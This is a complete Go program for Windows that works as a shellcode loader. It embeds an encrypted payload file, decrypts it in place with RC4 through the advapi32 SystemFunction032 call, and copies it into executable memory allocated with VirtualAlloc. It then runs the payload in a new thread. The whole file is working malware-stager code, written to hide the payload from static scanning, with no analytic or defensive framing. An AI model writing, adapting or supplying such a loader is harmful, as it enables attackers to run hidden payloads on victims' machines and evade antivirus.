package main

import (
	_ "embed"
	"fmt"
	"syscall"
	"unsafe"
)

//go:embed loader.bin
var encryptedShellcode []byte

var rc4Key = []byte("SuperSecretKey123!") // RC4 key (must match the one used to encrypt)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	INFINITE               = 0xFFFFFFFF
)

func rc4Decrypt(data []byte, key []byte) error {
	dll := syscall.NewLazyDLL("advapi32.dll")
	proc := dll.NewProc("SystemFunction032")

	keyBlob := DATA_BLOB{
		cbData: uint32(len(key)),
		pbData: &key[0],
	}

	dataBlob := DATA_BLOB{
		cbData: uint32(len(data)),
		pbData: &data[0],
	}

	ret, _, err := proc.Call(
		uintptr(unsafe.Pointer(&dataBlob)),
		uintptr(unsafe.Pointer(&keyBlob)),
	)
	if ret == 0 {
		return fmt.Errorf("SystemFunction032 failed: %v", err)
	}
	return nil
}

func main() {
	// Decrypt the shellcode in place
	err := rc4Decrypt(encryptedShellcode, rc4Key)
	if err != nil {
		fmt.Println("Decryption failed:", err)
		return
	}

	k32, err := syscall.LoadLibrary("kernel32.dll")
	if err != nil {
		fmt.Println("LoadLibrary kernel32.dll failed:", err)
		return
	}
	defer syscall.FreeLibrary(k32)

	virtualAlloc, err := syscall.GetProcAddress(k32, "VirtualAlloc")
	if err != nil {
		fmt.Println("GetProcAddress VirtualAlloc failed:", err)
		return
	}

	createThread, err := syscall.GetProcAddress(k32, "CreateThread")
	if err != nil {
		fmt.Println("GetProcAddress CreateThread failed:", err)
		return
	}

	waitForSingleObject, err := syscall.GetProcAddress(k32, "WaitForSingleObject")
	if err != nil {
		fmt.Println("GetProcAddress WaitForSingleObject failed:", err)
		return
	}

	// Allocate memory for the decrypted shellcode
	addr, _, err := syscall.Syscall6(
		uintptr(virtualAlloc),
		4,
		0,
		uintptr(len(encryptedShellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
		0,
		0,
	)
	if addr == 0 {
		fmt.Println("VirtualAlloc syscall failed:", err)
		return
	}

	// Copy decrypted shellcode into allocated memory
	mem := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(encryptedShellcode))
	copy(mem, encryptedShellcode)

	// Execute shellcode via a new thread
	thread, _, err := syscall.Syscall6(
		uintptr(createThread),
		6,
		0,
		0,
		addr,
		0,
		0,
		0,
	)
	if thread == 0 {
		fmt.Println("CreateThread syscall failed:", err)
		return
	}

	_, _, _ = syscall.Syscall6(
		uintptr(waitForSingleObject),
		2,
		thread,
		INFINITE,
		0,
		0,
		0,
		0,
	)
}
